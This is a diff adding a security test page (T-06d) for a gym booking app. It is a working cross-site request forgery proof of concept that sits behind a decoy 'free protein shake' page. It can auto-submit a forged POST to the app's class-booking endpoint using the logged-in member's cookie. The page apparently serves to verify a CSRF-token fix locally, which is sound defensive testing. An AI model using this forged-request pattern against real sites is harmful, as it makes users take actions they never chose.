@@ -1,0 +1,55 @@
+<!doctype html>
+<!--
+  T-06d: CSRF attack page (SEC-06). FOR LOCAL TESTING OF OUR OWN APP ONLY.
+
+  How to use:
+    1. Run the app (npm run dev) and log in as member@crunchgym.test in the browser.
+    2. In a second terminal, serve this folder on another port:
+         cd security-tests && python3 -m http.server 8081
+    3. In the SAME browser, open http://localhost:8081/csrf-attack.html
+    4. Enter a class ID the member has NOT booked (Classes page, or the admin Classes list),
+       then click "Launch attack" (or tick auto-submit and reload).
+    5. Check the result in the app (My classes) and in the frame below.
+
+  Expected:
+    v0 -> the booking is created (cookie is sent: another localhost port is the
+          "same site", so SameSite does not help, and there is no CSRF token).
+    v1 -> 403 "Security check failed (invalid or missing CSRF token)"; nothing booked;
+          a security.csrf_rejected entry appears in Admin -> Audit log.
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Totally harmless page</title>
+  <style>body{font-family:Arial,sans-serif;max-width:760px;margin:24px auto}iframe{width:100%;height:160px;border:1px solid #999}label{display:block;margin:8px 0}</style>
+</head>
+<body>
+  <h1>Win a free protein shake!</h1>
+  <p>(Hidden attack for test T-06d: a cross-site form POST to the Crunch Gym API, sent with the victim's cookie.)</p>
+
+  <label>Target app <input id="base" value="http://localhost:5173" size="30"></label>
+  <label>Class ID to book <input id="classId" value="37" size="6"></label>
+  <label><input type="checkbox" id="auto"> Auto-submit when the page loads</label>
+  <button id="go">Launch attack</button>
+
+  <form id="attack" method="POST" target="result">
+    <input type="hidden" name="note" value="forged">
+  </form>
+
+  <h3>Server response</h3>
+  <iframe name="result"></iframe>
+
+  <script>
+    const $ = (id) => document.getElementById(id);
+    try { $('auto').checked = localStorage.getItem('csrfAuto') === '1'; } catch {}
+    $('auto').onchange = () => { try { localStorage.setItem('csrfAuto', $('auto').checked ? '1' : '0'); } catch {} };
+    function launch() {
+      const f = $('attack');
+      f.action = `${$('base').value}/api/classes/${encodeURIComponent($('classId').value)}/book`;
+      f.submit();
+    }
+    $('go').onclick = launch;
+    if ($('auto').checked) launch();
+  </script>
+</body>
+</html>
